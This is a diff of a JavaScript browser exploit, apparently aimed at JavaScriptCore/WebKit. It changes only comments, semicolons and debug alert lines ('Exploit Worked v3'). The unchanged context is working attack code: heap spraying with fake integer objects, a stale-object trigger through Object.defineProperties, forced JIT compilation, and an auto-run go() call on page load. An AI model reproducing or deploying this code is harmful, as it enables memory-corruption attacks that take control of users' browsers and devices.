@@ -11,11 +11,7 @@
  for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
  var fc = new Function(trycatch);
  var fcp = 0;
- var smsh = new Uint32Array(0x10);
- 
- 
-//var original_val = 0;
-//var original_val1 = 0;
+ var smsh = new Uint32Array(0x10)
  
  var mem0 = 0;
  var mem1 = 0;
@@ -76,7 +72,6 @@ for (var i = 0; i < 0x1000; i++){
 }
 
 
-
  function allocbufptrs() {
  	if (bufs[0]) return;
 	dgc();
@@ -93,7 +88,7 @@ for (var i = 0; i < 0x1000; i++){
 	 
 	// Create 0x200 FFFF:0000:4141:4141 integer objects
  	for (i = 0; i < bufs.length; i++) {
- 		bufs[i] = new Uint32Array(0x100 * 2) //0x100 * 2
+ 		bufs[i] = new Uint32Array(0x100 * 2)
  		for (k = 0; k < bufs[i].length;) {
  			bufs[i][k++] = 0x41414141;
  			bufs[i][k++] = 0xffff0000;
@@ -144,15 +139,14 @@ for (var i = 0; i < 0x1000; i++){
  	Object.defineProperties(target, props);
  	stale = target.stale;
  	
-	/*
+	/*	 
 	if(before_len != stale.length){
-		alert("Exploit Worked v3");
+		//alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
 		document.location.reload();
 	}
 	*/
-	
 	stale[0] += 0x101;
 	 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
@@ -175,8 +169,8 @@ for (var i = 0; i < 0x1000; i++){
 				
                        		
 				//alert("Pushed stale");
-				//original_val = bufs[i][k];
-				//original_val1 = bufs[i][k+1];
+				//var original_val = bufs[i][k];
+				//var original_val1 = bufs[i][k+1];
 				
 				bufs.push(stale);
 				stale[0] = fc;
@@ -261,4 +255,3 @@ function go() {
     setTimeout(go_, 400);
 }
 go();
-
